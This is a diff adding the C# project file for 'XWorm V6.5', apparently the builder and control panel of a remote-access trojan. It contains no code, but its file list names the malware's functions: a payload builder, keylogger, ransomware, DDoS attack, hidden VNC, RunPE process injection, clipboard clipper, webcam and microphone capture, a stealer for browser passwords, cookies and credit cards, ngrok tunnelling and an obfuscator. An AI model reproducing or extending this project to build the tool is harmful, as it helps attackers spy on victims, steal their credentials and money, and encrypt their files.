@@ -1,0 +1,416 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{654245CC-1BE5-4349-A7B4-89091B7F6CCD}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>XWorm</RootNamespace>
+    <AssemblyName>XWorm V6.5</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>XWorm V6.5.ico</ApplicationIcon>
+    <StartupObject>XWorm.My.MyApplication</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="FastColoredTextBox" />
+    <Reference Include="GMap.NET.Core" />
+    <Reference Include="GMap.NET.WindowsForms" />
+    <Reference Include="Guna.UI2" />
+    <Reference Include="IconExtractor" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="NAudio" />
+    <Reference Include="SimpleObfuscator">
+      <HintPath>..\..\SimpleObfuscator.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="About.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="About.Designer.cs">
+      <DependentUpon>About.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ACT.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ACT.Designer.cs">
+      <DependentUpon>ACT.cs</DependentUpon>
+    </Compile>
+    <Compile Include="BridgeEndPoint.cs" />
+    <Compile Include="Builder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Builder.Designer.cs">
+      <DependentUpon>Builder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Chat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Chat.Designer.cs">
+      <DependentUpon>Chat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Client.cs" />
+    <Compile Include="Clipboard.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Clipboard.Designer.cs">
+      <DependentUpon>Clipboard.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Clipper.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Clipper.Designer.cs">
+      <DependentUpon>Clipper.cs</DependentUpon>
+    </Compile>
+    <Compile Include="CustomOpen.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CustomOpen.Designer.cs">
+      <DependentUpon>CustomOpen.cs</DependentUpon>
+    </Compile>
+    <Compile Include="DDosAttack.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="DDosAttack.Designer.cs">
+      <DependentUpon>DDosAttack.cs</DependentUpon>
+    </Compile>
+    <Compile Include="EditReg.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="EditReg.Designer.cs">
+      <DependentUpon>EditReg.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FilesSearcher.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FilesSearcher.Designer.cs">
+      <DependentUpon>FilesSearcher.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FM.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FM.Designer.cs">
+      <DependentUpon>FM.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Ftp.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Ftp.Designer.cs">
+      <DependentUpon>Ftp.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Fun.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Fun.Designer.cs">
+      <DependentUpon>Fun.cs</DependentUpon>
+    </Compile>
+    <Compile Include="GeoIP.cs" />
+    <Compile Include="HApps.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HApps.Designer.cs">
+      <DependentUpon>HApps.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Hash.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Hash.Designer.cs">
+      <DependentUpon>Hash.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HBrowser.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HBrowser.Designer.cs">
+      <DependentUpon>HBrowser.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Helper.cs" />
+    <Compile Include="Hosts.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Hosts.Designer.cs">
+      <DependentUpon>Hosts.cs</DependentUpon>
+    </Compile>
+    <Compile Include="HVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="HVNC.Designer.cs">
+      <DependentUpon>HVNC.cs</DependentUpon>
+    </Compile>
+    <Compile Include="IconInjector.cs" />
+    <Compile Include="INFO.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="INFO.Designer.cs">
+      <DependentUpon>INFO.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Item.cs" />
+    <Compile Include="Keylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Keylogger.Designer.cs">
+      <DependentUpon>Keylogger.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Listener.cs" />
+    <Compile Include="ListViewDoubleBuffer.cs" />
+    <Compile Include="LV.cs" />
+    <Compile Include="Main.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Main.Designer.cs">
+      <DependentUpon>Main.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Maps.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Maps.Designer.cs">
+      <DependentUpon>Maps.cs</DependentUpon>
+    </Compile>
+    <Compile Include="MBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MBox.Designer.cs">
+      <DependentUpon>MBox.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Messages.cs" />
+    <Compile Include="MIC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MIC.Designer.cs">
+      <DependentUpon>MIC.cs</DependentUpon>
+    </Compile>
+    <Compile Include="My\MyApplication.cs" />
+    <Compile Include="My\MyComputer.cs" />
+    <Compile Include="My\MyProject.cs" />
+    <Compile Include="My\MySettings.Designer.cs">
+      <DependentUpon>MySettings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="My\MySettingsProperty.cs" />
+    <Compile Include="My\Resources\Resources.cs" />
+    <Compile Include="ngrok.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ngrok.Designer.cs">
+      <DependentUpon>ngrok.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Performance.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Performance.Designer.cs">
+      <DependentUpon>Performance.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Port.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Port.Designer.cs">
+      <DependentUpon>Port.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessV.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessV.Designer.cs">
+      <DependentUpon>ProcessV.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Programs.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Programs.Designer.cs">
+      <DependentUpon>Programs.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Proxy.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Proxy.Designer.cs">
+      <DependentUpon>Proxy.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Ransomware.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Ransomware.Designer.cs">
+      <DependentUpon>Ransomware.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Registry.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Registry.Designer.cs">
+      <DependentUpon>Registry.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Relay.cs" />
+    <Compile Include="RemoteDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RemoteDesktop.Designer.cs">
+      <DependentUpon>RemoteDesktop.cs</DependentUpon>
+    </Compile>
+    <Compile Include="RunPE.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RunPE.Designer.cs">
+      <DependentUpon>RunPE.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Server.cs" />
+    <Compile Include="ServiceManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ServiceManager.Designer.cs">
+      <DependentUpon>ServiceManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="SettingsHelper.cs" />
+    <Compile Include="Shell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Shell.Designer.cs">
+      <DependentUpon>Shell.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Sound.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Sound.Designer.cs">
+      <DependentUpon>Sound.cs</DependentUpon>
+    </Compile>
+    <Compile Include="StartupManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="StartupManager.Designer.cs">
+      <DependentUpon>StartupManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Stealer\AutoFill.cs" />
+    <Compile Include="Stealer\Bookmark.cs" />
+    <Compile Include="Stealer\BrsInfo.cs" />
+    <Compile Include="Stealer\Cookie.cs" />
+    <Compile Include="Stealer\CreditCard.cs" />
+    <Compile Include="Stealer\Password.cs" />
+    <Compile Include="Stealer\Site.cs" />
+    <Compile Include="TBotNotify.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TBotNotify.Designer.cs">
+      <DependentUpon>TBotNotify.cs</DependentUpon>
+    </Compile>
+    <Compile Include="TcpConnectionForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TcpConnectionForm.Designer.cs">
+      <DependentUpon>TcpConnectionForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="ToolsBox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ToolsBox.Designer.cs">
+      <DependentUpon>ToolsBox.cs</DependentUpon>
+    </Compile>
+    <Compile Include="TXT.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TXT.Designer.cs">
+      <DependentUpon>TXT.cs</DependentUpon>
+    </Compile>
+    <Compile Include="VB$AnonymousDelegate_0.cs" />
+    <Compile Include="VBCode.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="VBCode.Designer.cs">
+      <DependentUpon>VBCode.cs</DependentUpon>
+    </Compile>
+    <Compile Include="VoiceChat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="VoiceChat.Designer.cs">
+      <DependentUpon>VoiceChat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="WebCam.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="WebCam.Designer.cs">
+      <DependentUpon>WebCam.cs</DependentUpon>
+    </Compile>
+    <Compile Include="XWormTask.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="About.resources" />
+    <EmbeddedResource Include="ACT.resources" />
+    <EmbeddedResource Include="Builder.resources" />
+    <EmbeddedResource Include="Chat.resources" />
+    <EmbeddedResource Include="Clipboard.resources" />
+    <EmbeddedResource Include="Clipper.resources" />
+    <EmbeddedResource Include="CustomOpen.resources" />
+    <EmbeddedResource Include="DDosAttack.resources" />
+    <EmbeddedResource Include="EditReg.resources" />
+    <EmbeddedResource Include="FilesSearcher.resources" />
+    <EmbeddedResource Include="FM.resources" />
+    <EmbeddedResource Include="Ftp.resources" />
+    <EmbeddedResource Include="Fun.resources" />
+    <EmbeddedResource Include="HApps.resources" />
+    <EmbeddedResource Include="Hash.resources" />
+    <EmbeddedResource Include="HBrowser.resources" />
+    <EmbeddedResource Include="Hosts.resources" />
+    <EmbeddedResource Include="HVNC.resources" />
+    <EmbeddedResource Include="INFO.resources" />
+    <EmbeddedResource Include="Keylogger.resources" />
+    <EmbeddedResource Include="Main.resources" />
+    <EmbeddedResource Include="Maps.resources" />
+    <EmbeddedResource Include="MBox.resources" />
+    <EmbeddedResource Include="MIC.resources" />
+    <EmbeddedResource Include="ngrok.resources" />
+    <EmbeddedResource Include="Performance.resources" />
+    <EmbeddedResource Include="Port.resources" />
+    <EmbeddedResource Include="ProcessV.resources" />
+    <EmbeddedResource Include="Programs.resources" />
+    <EmbeddedResource Include="Proxy.resources" />
+    <EmbeddedResource Include="Ransomware.resources" />
+    <EmbeddedResource Include="Registry.resources" />
+    <EmbeddedResource Include="RemoteDesktop.resources" />
+    <EmbeddedResource Include="Resources.resources" />
+    <EmbeddedResource Include="RunPE.resources" />
+    <EmbeddedResource Include="ServiceManager.resources" />
+    <EmbeddedResource Include="Shell.resources" />
+    <EmbeddedResource Include="Sound.resources" />
+    <EmbeddedResource Include="StartupManager.resources" />
+    <EmbeddedResource Include="TBotNotify.resources" />
+    <EmbeddedResource Include="TcpConnectionForm.resources" />
+    <EmbeddedResource Include="ToolsBox.resources" />
+    <EmbeddedResource Include="TXT.resources" />
+    <EmbeddedResource Include="VBCode.resources" />
+    <EmbeddedResource Include="VoiceChat.resources" />
+    <EmbeddedResource Include="WebCam.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="My\MySettings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>MySettings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
